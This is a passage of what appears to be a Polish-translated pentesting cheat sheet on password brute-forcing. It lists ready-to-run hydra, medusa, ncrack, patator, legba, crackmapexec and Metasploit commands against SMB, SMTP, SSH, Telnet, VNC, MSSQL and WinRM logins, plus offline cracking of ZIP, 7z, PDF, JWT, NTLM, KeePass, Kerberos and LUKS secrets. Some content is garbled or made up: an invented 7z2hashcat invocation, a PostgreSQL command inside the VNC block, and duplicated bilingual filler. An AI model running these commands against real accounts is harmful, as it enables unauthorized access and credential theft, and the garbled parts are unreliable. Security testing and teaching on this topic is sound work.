- Blokowanie konta po wielokrotnych nieudanych próbach logowania: Można skonfigurować system, aby blokował konto po określonej liczbie nieudanych prób logowania.
- Używanie dwuetapowej weryfikacji: Włączenie dwuetapowej weryfikacji dodaje dodatkową warstwę zabezpieczeń, która utrudnia atakującym złamanie hasła.

#### Podsumowanie

Brute force atak na SMB jest popularną techniką wykorzystywaną przez atakujących do złamania hasła do konta SMB. Istnieje wiele narzędzi dostępnych do przeprowadzenia takiego ataku, dlatego ważne jest podjęcie odpowiednich środków ostrożności, takich jak używanie silnych haseł i blokowanie konta po wielokrotnych nieudanych próbach logowania, aby zabezpieczyć się przed tym rodzajem ataku.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

SMTP (Simple Mail Transfer Protocol) jest protokołem używanym do przesyłania wiadomości e-mail między serwerami. Jest to powszechnie stosowany protokół do wysyłania wiadomości e-mail przez klientów poczty elektronicznej.

#### Ataki Brute Force na SMTP

Ataki Brute Force na SMTP polegają na próbie odgadnięcia hasła do konta e-mail poprzez wypróbowanie różnych kombinacji haseł. Atakujący może wykorzystać różne metody, takie jak słownikowe ataki Brute Force, ataki hybrydowe lub ataki oparte na regułach, aby złamać hasło.

#### Narzędzia do ataków Brute Force na SMTP

Istnieje wiele narzędzi dostępnych do przeprowadzania ataków Brute Force na SMTP. Niektóre z popularnych narzędzi to:

- Hydra: Narzędzie do przeprowadzania ataków Brute Force na różne protokoły, w tym SMTP.
- Medusa: Narzędzie do przeprowadzania ataków Brute Force na różne protokoły, w tym SMTP.
- Ncrack: Narzędzie do przeprowadzania ataków Brute Force na różne protokoły, w tym SMTP.

#### Zabezpieczenia przed atakami Brute Force na SMTP

Aby zabezpieczyć serwer SMTP przed atakami Brute Force, można podjąć następujące środki ostrożności:

- Używanie silnych haseł: Ważne jest, aby używać długich i złożonych haseł, które są trudne do odgadnięcia.
- Blokowanie kont po wielokrotnych nieudanych próbach logowania: Można skonfigurować serwer SMTP w taki sposób, aby blokował konto po określonej liczbie nieudanych prób logowania.
- Używanie mechanizmów CAPTCHA: Dodanie mechanizmów CAPTCHA do formularzy logowania może pomóc w zidentyfikowaniu i zablokowaniu automatycznych ataków Brute Force.
- Monitorowanie logów: Regularne monitorowanie logów serwera SMTP może pomóc w wykrywaniu podejrzanej aktywności i podejmowaniu odpowiednich działań.

#### Podsumowanie

Ataki Brute Force na SMTP są powszechnym zagrożeniem dla serwerów poczty elektronicznej. Aby zabezpieczyć serwer SMTP przed takimi atakami, należy stosować odpowiednie środki ostrożności, takie jak używanie silnych haseł, blokowanie kont po wielokrotnych nieudanych próbach logowania, stosowanie mechanizmów CAPTCHA i regularne monitorowanie logów.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
SOCKS (Socket Secure) to protokół internetowy, który umożliwia przekazywanie danych między klientem a serwerem za pośrednictwem serwera pośredniczącego. Jest często wykorzystywany do omijania blokad sieciowych i anonimowego przeglądania internetu. Atakujący mogą wykorzystać SOCKS do przeprowadzenia ataków brute force na różne usługi, takie jak SSH, FTP czy SMTP, próbując wielokrotnie różne kombinacje haseł, aż do znalezienia poprawnego.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

SQL Server to system zarządzania bazą danych opracowany przez firmę Microsoft. Jest szeroko stosowany w różnych aplikacjach i środowiskach biznesowych. Poniżej przedstawiamy kilka technik ataku brute-force, które można zastosować w celu złamania zabezpieczeń SQL Server.

#### Atak słownikowy

Atak słownikowy polega na próbie odgadnięcia hasła, korzystając z listy popularnych haseł lub słowników. Można to zrobić za pomocą narzędzi takich jak Hydra lub Medusa, które automatycznie testują różne kombinacje haseł.

#### Atak siłowy

Atak siłowy polega na próbie odgadnięcia hasła, testując wszystkie możliwe kombinacje znaków. Można to zrobić za pomocą narzędzi takich jak John the Ripper lub Hashcat, które wykorzystują techniki brute-force do złamania hasła.

#### Atak na słabe hasła

Atak na słabe hasła polega na próbie odgadnięcia hasła, korzystając z popularnych kombinacji znaków, takich jak "123456" lub "password". Wielu użytkowników nadal korzysta z takich słabych haseł, co czyni je podatnymi na ataki brute-force.

#### Atak na nazwy użytkowników

Atak na nazwy użytkowników polega na próbie odgadnięcia nazwy użytkownika, która może być używana jako część poświadczeń logowania. Można to zrobić, testując różne kombinacje nazw użytkowników za pomocą narzędzi takich jak Hydra lub Medusa.

#### Atak na zabezpieczenia konta

Atak na zabezpieczenia konta polega na próbie złamania zabezpieczeń konta, takich jak blokada po kilkukrotnym nieudanym logowaniu. Można to zrobić, testując różne kombinacje haseł lub wykorzystując luki w implementacji zabezpieczeń.

#### Atak na protokół komunikacyjny

Atak na protokół komunikacyjny polega na próbie złamania zabezpieczeń protokołu komunikacyjnego, który jest używany do komunikacji z bazą danych SQL Server. Można to zrobić, analizując ruch sieciowy i próbując znaleźć luki w protokole.

#### Atak na luki w oprogramowaniu

Atak na luki w oprogramowaniu polega na próbie wykorzystania znanych luk w oprogramowaniu SQL Server do złamania zabezpieczeń. Można to zrobić, wykorzystując publicznie dostępne exploit-y lub tworząc własne exploit-y.

#### Atak na uwierzytelnianie systemu operacyjnego

Atak na uwierzytelnianie systemu operacyjnego polega na próbie złamania zabezpieczeń systemu operacyjnego, na którym działa SQL Server. Można to zrobić, wykorzystując luki w systemie operacyjnym lub próbując złamać hasło administratora systemu.

#### Atak na zabezpieczenia fizyczne

Atak na zabezpieczenia fizyczne polega na próbie złamania zabezpieczeń fizycznych serwera, na którym działa SQL Server. Można to zrobić, próbując uzyskać fizyczny dostęp do serwera lub wykorzystując luki w zabezpieczeniach fizycznych.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) to protokół sieciowy, który umożliwia bezpieczne zdalne logowanie i wykonywanie poleceń na zdalnych maszynach. Jest szeroko stosowany w środowiskach linuksowych i umożliwia szyfrowaną komunikację między klientem a serwerem.

#### Ataki Brute Force na SSH

Ataki Brute Force na SSH polegają na próbie odgadnięcia hasła użytkownika SSH poprzez wypróbowanie różnych kombinacji haseł. Atakujący może używać słowników haseł lub generować losowe kombinacje. Istnieje wiele narzędzi dostępnych do przeprowadzania ataków Brute Force na SSH, takich jak Hydra, Medusa czy Patator.

#### Zabezpieczenia przed atakami Brute Force na SSH

Aby zabezpieczyć się przed atakami Brute Force na SSH, można podjąć następujące kroki:

1. Użyj silnego hasła: Wybierz hasło, które jest trudne do odgadnięcia i zawiera kombinację liter, cyfr i znaków specjalnych.

2. Użyj kluczy SSH: Zamiast korzystać z hasła, można użyć kluczy SSH do uwierzytelniania. Klucze SSH są bardziej bezpieczne i trudniejsze do złamania niż hasła.

3. Zmniejsz liczbę prób logowania: Skonfiguruj serwer SSH tak, aby ograniczyć liczbę prób logowania. Można to zrobić poprzez ustawienie parametru `MaxAuthTries` w pliku konfiguracyjnym SSH.

4. Monitoruj logi: Regularnie sprawdzaj logi SSH w celu wykrycia podejrzanej aktywności. Można skonfigurować narzędzia monitorujące, które powiadomią o podejrzanej aktywności, takiej jak wielokrotne nieudane próby logowania.

5. Użyj narzędzi do wykrywania ataków: Istnieją narzędzia, takie jak fail2ban, które automatycznie blokują adresy IP, z których pochodzą podejrzane próby logowania.

6. Zaktualizuj oprogramowanie: Regularnie aktualizuj oprogramowanie serwera SSH, aby korzystać z najnowszych poprawek zabezpieczeń.

7. Użyj dodatkowych warstw zabezpieczeń: Rozważ użycie dodatkowych warstw zabezpieczeń, takich jak VPN lub firewall, aby ograniczyć dostęp do serwera SSH tylko do zaufanych adresów IP.

Pamiętaj, że ataki Brute Force na SSH są powszechne, dlatego ważne jest podjęcie odpowiednich środków ostrożności, aby zabezpieczyć swoje systemy przed takimi atakami.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Słabe klucze SSH / Przewidywalny PRNG w Debianie

Niektóre systemy mają znane wady w losowym ziarnie używanym do generowania materiałów kryptograficznych. Może to prowadzić do znacznie zmniejszonej przestrzeni kluczy, która może być łamana przy użyciu narzędzi takich jak [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Dostępne są również wcześniej wygenerowane zestawy słabych kluczy, takie jak [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ i OpenMQ)

Protokół tekstowy STOMP jest powszechnie stosowanym protokołem komunikacyjnym, który **umożliwia bezproblemową komunikację i interakcję z popularnymi usługami kolejkowania wiadomości**, takimi jak RabbitMQ, ActiveMQ, HornetQ i OpenMQ. Zapewnia on standaryzowane i wydajne podejście do wymiany wiadomości i wykonywania różnych operacji związanych z przesyłaniem wiadomości.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet jest protokołem sieciowym, który umożliwia zdalne logowanie się do urządzeń sieciowych. Może być używany do zarządzania urządzeniami sieciowymi, takimi jak routery, przełączniki i serwery. 

Atak brute force na Telnet polega na próbie odgadnięcia hasła, korzystając z automatycznego programu, który wypróbuje różne kombinacje haseł, aż znajdzie poprawne. 

Istnieje wiele narzędzi dostępnych do przeprowadzania ataków brute force na Telnet, takich jak Hydra, Medusa i Patator. Te narzędzia automatyzują proces testowania haseł, co znacznie przyspiesza proces ataku. 

Aby zabezpieczyć się przed atakami brute force na Telnet, zaleca się stosowanie silnych haseł, ograniczenie liczby prób logowania i korzystanie z innych, bardziej bezpiecznych protokołów do zdalnego logowania, takich jak SSH.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC (Virtual Network Computing) to protokół umożliwiający zdalne sterowanie komputerem. Atakujący może wykorzystać technikę brute force, aby złamać hasło VNC i uzyskać nieautoryzowany dostęp do zdalnego komputera.

#### Metoda Brute Force dla VNC

Metoda brute force polega na próbie wszystkich możliwych kombinacji haseł, aż do znalezienia poprawnego. Istnieje wiele narzędzi dostępnych do przeprowadzenia ataku brute force na protokół VNC, takich jak Hydra, Medusa czy VNCrack.

Aby przeprowadzić atak brute force na VNC, należy znać adres IP zdalnego komputera oraz port, na którym działa usługa VNC (domyślnie port 5900). Następnie można użyć narzędzi do przeprowadzenia ataku brute force, podając listę możliwych haseł lub wykorzystując słownik haseł.

Warto również zauważyć, że niektóre implementacje VNC mają mechanizmy ochrony przed atakami brute force, takie jak opóźnienia między próbami logowania lub blokowanie konta po określonej liczbie nieudanych prób.

#### Zabezpieczenia przed atakiem brute force na VNC

Aby zabezpieczyć się przed atakiem brute force na VNC, można podjąć następujące kroki:

1. Zmiana domyślnego portu VNC na inny, trudniejszy do zgadnięcia.
2. Używanie silnych haseł, które są trudne do odgadnięcia.
3. Włączenie mechanizmów ochrony przed atakami brute force dostępnych w niektórych implementacjach VNC.
4. Używanie VPN lub innych zabezpieczonych połączeń do zdalnego dostępu.

Pamiętaj, że ataki brute force są nielegalne, chyba że masz uprawnienia do przeprowadzania testów penetracyjnych na własnym systemie lub otrzymałeś zgodę od właściciela systemu.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm (Windows Remote Management) jest protokołem zarządzania zdalnego, który umożliwia administratorom zdalne zarządzanie systemami Windows. Protokół ten jest oparty na usłudze Windows Remote Management (WS-Management) i umożliwia wykonywanie poleceń, przesyłanie plików oraz zdalne uruchamianie skryptów na zdalnych maszynach Windows.

#### Ataki Brute Force na Winrm

Ataki Brute Force na Winrm polegają na próbie odgadnięcia hasła administratora poprzez wielokrotne wypróbowanie różnych kombinacji haseł. Istnieje wiele narzędzi dostępnych do przeprowadzania ataków Brute Force na Winrm, takich jak `winrm-brute` czy `winrm-cli`.

Aby zabezpieczyć się przed atakami Brute Force na Winrm, zaleca się:

- Używanie silnych haseł, które są trudne do odgadnięcia.
- Włączenie blokady konta po określonej liczbie nieudanych prób logowania.
- Skonfigurowanie zabezpieczeń na poziomie sieci, takich jak ograniczenie dostępu do usługi Winrm tylko z określonych adresów IP.
- Użycie mechanizmów uwierzytelniania opartych na kluczach, takich jak uwierzytelnianie oparte na certyfikatach.

W przypadku podejrzenia ataku Brute Force na Winrm, zaleca się monitorowanie logów zdarzeń systemu Windows w celu wykrycia podejrzanej aktywności oraz podjęcie odpowiednich działań w celu zabezpieczenia systemu.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować** zadania przy użyciu najbardziej zaawansowanych narzędzi społeczności.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Lokalne

### Bazy danych do łamania haseł online

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 i SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 z/ bez ESS/SSP i z dowolną wartością wyzwania)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashe, przechwyty WPA2 i archiwa MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashe)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashe i hashe plików)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashe)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashe)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Sprawdź to przed próbą łamania hasha.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Atak znany jakościowo na pliki zip

Musisz znać **tekst jawnie** (lub część tekstu jawnego) **pliku zawartego wewnątrz** zaszyfrowanego pliku zip. Możesz sprawdzić **nazwy plików i rozmiar plików zawartych wewnątrz** zaszyfrowanego pliku zip, uruchamiając: **`7z l encrypted.zip`**\
Pobierz [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) ze strony wydań.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7z to popularne narzędzie do kompresji plików, które obsługuje wiele formatów, takich jak 7z, ZIP, RAR, TAR i wiele innych. Może być również używane do ataków brute-force na hasła plików chronionych hasłem.

Aby przeprowadzić atak brute-force na plik 7z, można użyć narzędzia o nazwie "7z2hashcat". Narzędzie to konwertuje plik 7z na format, który może być odczytany przez program do łamania haseł o nazwie "hashcat". Następnie można użyć "hashcat" do przeprowadzenia ataku brute-force na plik 7z, próbując różne kombinacje haseł, aż zostanie znalezione poprawne hasło.

Przykład użycia narzędzia "7z2hashcat":

```plaintext
7z2hashcat -f file.7z -m 11600 -d dictionary.txt -o cracked.txt
```

W powyższym przykładzie:

- `-f file.7z` określa plik 7z, na którym ma być przeprowadzony atak brute-force.
- `-m 11600` określa typ hasha używanego w pliku 7z.
- `-d dictionary.txt` określa słownik, który zostanie użyty do ataku brute-force.
- `-o cracked.txt` określa plik, w którym zostaną zapisane znalezione hasła.

Należy pamiętać, że ataki brute-force mogą być czasochłonne, zwłaszcza jeśli używane są długie i skomplikowane hasła. Dlatego ważne jest, aby używać silnych haseł i zabezpieczeń, aby utrudnić takie ataki.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

Brute force attack, also known as exhaustive search, is a common hacking technique used to crack passwords or encryption keys. It involves systematically trying every possible combination until the correct one is found.

#### Types of Brute Force Attacks

1. **Simple Brute Force**: In this type of attack, the hacker tries all possible combinations of characters, starting from the shortest to the longest password or key length. This method is time-consuming and requires significant computational power.

2. **Dictionary Attack**: In a dictionary attack, the hacker uses a pre-generated list of commonly used passwords or words from a dictionary. This method is more efficient than simple brute force as it reduces the number of combinations to try.

3. **Hybrid Attack**: A hybrid attack combines elements of both simple brute force and dictionary attacks. It involves trying all possible combinations of characters, but also includes variations such as adding numbers or special characters to the dictionary words.

#### Countermeasures Against Brute Force Attacks

To protect against brute force attacks, it is important to implement strong password policies and use robust encryption algorithms. Here are some countermeasures to consider:

1. **Password Complexity**: Encourage users to create complex passwords that include a combination of uppercase and lowercase letters, numbers, and special characters. This increases the number of possible combinations, making it harder for attackers to guess the password.

2. **Account Lockout**: Implement an account lockout mechanism that temporarily locks an account after a certain number of failed login attempts. This prevents attackers from continuously trying different combinations.

3. **Rate Limiting**: Implement rate limiting to restrict the number of login attempts within a specific time period. This helps prevent automated brute force attacks by slowing down the rate at which the attacker can try different combinations.

4. **Two-Factor Authentication (2FA)**: Implement 2FA to add an extra layer of security. This requires users to provide a second form of authentication, such as a code sent to their mobile device, in addition to their password.

5. **Monitoring and Alerting**: Implement monitoring and alerting systems to detect and notify administrators of any suspicious login attempts or patterns. This allows for timely response and mitigation of potential brute force attacks.

By implementing these countermeasures, organizations can significantly reduce the risk of successful brute force attacks and enhance the security of their systems and data.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Hasło właściciela pliku PDF

Aby złamać hasło właściciela pliku PDF, sprawdź to: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Łamanie hasła NTLM

NTLM (New Technology LAN Manager) to protokół uwierzytelniania używany w systemach Windows. Łamanie hasła NTLM polega na próbie odgadnięcia hasła użytkownika, korzystając z różnych technik, takich jak atak słownikowy, atak brute force lub atak w oparciu o reguły.

#### Atak słownikowy

Atak słownikowy polega na przetestowaniu różnych kombinacji słów z listy słownikowej. Lista ta może zawierać popularne hasła, słowa związane z użytkownikiem lub inne słowa, które mogą być związane z hasłem.

#### Atak brute force

Atak brute force polega na przetestowaniu wszystkich możliwych kombinacji znaków, aby odgadnąć hasło. Ten rodzaj ataku może być bardzo czasochłonny, zwłaszcza jeśli hasło jest długie i skomplikowane.

#### Atak w oparciu o reguły

Atak w oparciu o reguły polega na zastosowaniu zestawu reguł do generowania różnych kombinacji znaków. Reguły te mogą obejmować zmianę wielkości liter, dodawanie lub usuwanie znaków specjalnych, podwajanie znaków itp. Ten rodzaj ataku może zwiększyć szanse na odgadnięcie hasła.

#### Narzędzia do łamania hasła NTLM

Istnieje wiele narzędzi dostępnych do łamania hasła NTLM, takich jak John the Ripper, Hashcat, Cain & Abel, Hydra itp. Te narzędzia umożliwiają przeprowadzenie ataków słownikowych, ataków brute force i ataków w oparciu o reguły w celu złamania hasła NTLM.

#### Zabezpieczenia przed łamaniem hasła NTLM

Aby zabezpieczyć się przed łamaniem hasła NTLM, zaleca się stosowanie silnych haseł, które są długie, skomplikowane i niełatwe do odgadnięcia. Dodatkowo, można zastosować techniki takie jak uwierzytelnianie dwuskładnikowe, które dodatkowo zabezpieczą konto użytkownika.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass to darmowy i otwartoźródłowy menedżer haseł, który umożliwia przechowywanie i zarządzanie bezpiecznymi hasłami. Jest to przydatne narzędzie do zapamiętywania i generowania silnych haseł dla różnych kont online. Keepass oferuje również funkcję automatycznego wypełniania formularzy, co ułatwia logowanie na stronach internetowych. Aby zwiększyć bezpieczeństwo, Keepass używa silnego szyfrowania AES-256 do przechowywania haseł. Można również zabezpieczyć bazę danych hasłami głównymi lub plikami klucza. Keepass jest dostępny na różne platformy, w tym Windows, macOS, Linux, Android i iOS.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting to technika ataku, która polega na wykorzystaniu słabych haseł kont usług Active Directory. W przypadku Keberoastingu, atakujący identyfikuje konta użytkowników, które mają skonfigurowane hasła usług (Service Principal Names - SPN) i które są przechowywane w postaci skrótu. Atakujący może następnie wykorzystać te skróty, aby przeprowadzić atak brute-force w celu złamania hasła.

#### Wykrywanie kont usług

Aby zidentyfikować konta usług, które mogą być podatne na Keberoasting, można użyć narzędzi takich jak BloodHound, PowerView lub Get-NetUser. Te narzędzia umożliwiają wyszukanie kont użytkowników, które mają skonfigurowane hasła usług.

#### Atak brute-force

Po zidentyfikowaniu kont usług, atakujący może przeprowadzić atak brute-force, próbując złamać hasło. Istnieje wiele narzędzi dostępnych do przeprowadzenia ataku brute-force, takich jak Rubeus, Hashcat lub John the Ripper. Te narzędzia umożliwiają atakującemu przeprowadzenie wielu prób złamania hasła, wykorzystując różne techniki, takie jak słownikowe ataki, ataki oparte na regułach lub ataki hybrydowe.

#### Zabezpieczenia przed Keberoastingiem

Aby zabezpieczyć się przed Keberoastingiem, można podjąć kilka środków ostrożności, takich jak:

- Regularne monitorowanie kont usług i usuwanie niepotrzebnych kont.
- Wymuszanie silnych haseł dla kont usług.
- Używanie narzędzi do wykrywania kont usług podatnych na Keberoasting.
- Regularna zmiana haseł kont usług.

Przestrzeganie tych środków ostrożności może pomóc w minimalizacji ryzyka Keberoastingu i zwiększeniu bezpieczeństwa kont usług w usługach Active Directory.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Obrazek Lucks

#### Metoda 1

Instalacja: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Metoda 2

##### Brute Force

##### Atak Brute Force

Brute force is a technique used to crack passwords or encryption keys by systematically trying all possible combinations until the correct one is found. It is a time-consuming method that requires a lot of computational power, but it can be effective against weak passwords or encryption algorithms.

Atak brute force to technika używana do złamania haseł lub kluczy szyfrowania poprzez systematyczne próbowanie wszystkich możliwych kombinacji, aż zostanie znaleziona poprawna. Jest to metoda czasochłonna, wymagająca dużej mocy obliczeniowej, ale może być skuteczna wobec słabych haseł lub algorytmów szyfrowania.

##### Tools

##### Narzędzia

There are several tools available for performing brute force attacks, including:

Istnieje kilka narzędzi dostępnych do przeprowadzania ataków brute force, w tym:

- Hydra: A popular tool for performing online password attacks against various protocols.

- Hydra: Popularne narzędzie do przeprowadzania ataków na hasła online przeciwko różnym protokołom.

- Medusa: A command-line tool for brute forcing login credentials.

- Medusa: Narzędzie wiersza poleceń do łamania danych logowania metodą brute force.

- John the Ripper: A password cracking tool that can perform brute force attacks.

- John the Ripper: Narzędzie do łamania haseł, które może przeprowadzać ataki brute force.

- Hashcat: A powerful password recovery tool that supports brute force attacks.

- Hashcat: Potężne narzędzie do odzyskiwania haseł obsługujące ataki brute force.

##### Techniques

##### Techniki

There are different techniques that can be used in brute force attacks, including:

Istnieją różne techniki, które mogą być stosowane w atakach brute force, w tym:

- Dictionary Attack: This technique involves using a pre-defined list of commonly used passwords or words from a dictionary to try and crack the password.

- Atak słownikowy: Ta technika polega na użyciu predefiniowanej listy powszechnie używanych haseł lub słów z słownika w celu próby złamania hasła.

- Hybrid Attack: This technique combines a dictionary attack with variations such as adding numbers or special characters to the dictionary words.

- Atak hybrydowy: Ta technika łączy atak słownikowy z wariantami, takimi jak dodawanie liczb lub znaków specjalnych do słów ze słownika.

- Mask Attack: This technique involves creating a mask that represents the password pattern and trying all possible combinations based on that mask.

- Atak maskowy: Ta technika polega na stworzeniu maski, która reprezentuje wzorzec hasła i próbowaniu wszystkich możliwych kombinacji na podstawie tej maski.

- Rule-based Attack: This technique involves applying a set of rules or transformations to a word or password list to generate variations and try them as potential passwords.

- Atak oparty na regułach: Ta technika polega na zastosowaniu zestawu reguł lub transformacji do listy słów lub haseł w celu generowania wariantów i próbowania ich jako potencjalnych haseł.

##### Countermeasures

##### Przeciwdziałanie

To protect against brute force attacks, it is important to use strong and unique passwords, implement account lockouts after a certain number of failed login attempts, and use multi-factor authentication. Additionally, monitoring and logging failed login attempts can help detect and respond to brute force attacks in a timely manner.

